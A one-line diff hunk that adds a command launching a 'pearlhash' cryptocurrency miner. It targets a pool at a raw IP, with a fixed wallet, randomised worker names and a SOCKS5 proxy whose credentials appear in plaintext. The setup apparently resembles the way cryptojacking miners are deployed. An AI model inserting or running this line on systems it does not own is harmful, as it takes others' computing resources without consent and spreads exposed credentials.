@@ -1,0 +1,1 @@
+./wild --algo pearlhash --url 107.172.222.195:80 --user prl1p7ywpecpnx8acnac87vzll58eyx92fjsf3r0t2ywnv08sr6pmrz3s8y7y36@nock=9qUSzcRMmZsxE4jufi7yNVBomSUvLTk4m6tHwamsJst11cbahRXYuLx.$(shuf -n 1 -i 1-999999999) --proxy socks5://yoga:yoga123@43.173.108.34:443
